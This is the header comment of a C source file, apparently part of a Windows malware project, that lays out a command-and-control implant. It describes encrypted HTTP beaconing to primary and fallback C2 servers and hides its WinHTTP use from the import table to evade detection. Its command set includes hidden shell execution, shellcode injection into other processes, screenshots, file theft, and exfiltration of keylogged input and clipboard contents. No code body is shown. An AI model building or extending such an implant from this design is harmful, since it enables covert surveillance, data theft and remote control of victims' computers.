/*
 * lb_c2.c
 * Platform  : Windows 7+ (x86/x64)
 * File      : lb_c2.c
 * Compiler  : MSVC cl  /  MinGW-w64 gcc (>= 12)
 *
 * Build (MSVC):
 *   cl boom.c lb_payload.c lb_c2.c /Felb.exe
 *      /link ws2_32.lib advapi32.lib shell32.lib gdi32.lib user32.lib bcrypt.lib
 *
 * Build (MinGW):
 *   gcc boom.c lb_payload.c lb_c2.c -o lb.exe
 *       -lws2_32 -ladvapi32 -lshell32 -lgdi32 -luser32 -lbcrypt
 *
 * Role      : C2 implant channel.
 *   - AES-128-CBC encryption via BCrypt CNG (bcrypt.dll, linked statically)
 *   - WinHTTP loaded at runtime (LoadLibraryA) — no winhttp.lib, no static
 *     import table entry for winhttp functions
 *   - Encrypted HTTP(S) beaconing with jitter
 *   - Primary / fallback C2 with automatic switchover
 *   - Full command dispatcher: SHELL, PS, KILL, DOWNLOAD, UPLOAD,
 *     SCREENSHOT, INJECT, SLEEP, KEYLOG_GET, CLIP_GET, DIE
 *   - Replaces net_beacon() and exfil_send_raw() from boom.c / lb_payload.c
 *
 * Protocol:
 *   Beacon  POST /<C2_BEACON_URI>
 *           Body : base64( IV[16] || AES128CBC(checkin_json) )
 *           Resp : base64( IV[16] || AES128CBC(task_blob) )  or empty
 *   Result  POST /<C2_RESULT_URI>
 *           Hdr  : X-Sess: <agent_id>
 *           Body : base64( IV[16] || AES128CBC(result_blob) )
 *
 *   task_blob   := CMD_TYPE '\n' param1 '\n' param2 '\n' ...
 *   result_blob := CMD_TYPE '\n' exit_status '\n' data
 *
 * Sections:
 *   1   Compile-time configuration
 *   2   WinHTTP type definitions (all inline, no winhttp.h dependency)
 *   3   C2 state structure
 *   4   Utility (agent ID, OS version, privilege check, jitter, logging)
 *   5   Base64 encode / decode
 *   6   BCrypt CNG: key derivation (SHA-256) + AES-128-CBC encrypt/decrypt
 *   7   WinHTTP dynamic loader
 *   8   HTTP request helper (shared POST/GET path)
 *   9   Beacon protocol: check-in, response parse, result post, line split
 *  10   Command handlers
 *       10.1  NOP
 *       10.2  SHELL  — hidden CreateProcess, pipe stdout+stderr, report
 *       10.3  PS     — Toolhelp32 process list
 *       10.4  KILL   — TerminateProcess by PID
 *       10.5  DOWNLOAD — HTTP GET from C2 → local disk
 *       10.6  UPLOAD   — local file → encrypted HTTP POST
 *       10.7  SCREENSHOT — GDI BitBlt BMP in memory → encrypted HTTP POST
 *       10.8  INJECT   — base64 shellcode → VirtualAllocEx + CRT injection
 *       10.9  SLEEP    — reconfigure beacon interval + jitter
 *       10.10 KEYLOG_GET — exfil keylog accumulation file
 *       10.11 CLIP_GET   — exfil clipboard harvest file
 *       10.12 DIE        — signal clean shutdown
 *  11   Command dispatcher
 *  12   Fallback C2 switchover
 *  13   Public API: c2_init, c2_run, c2_report_event, c2_shutdown
 */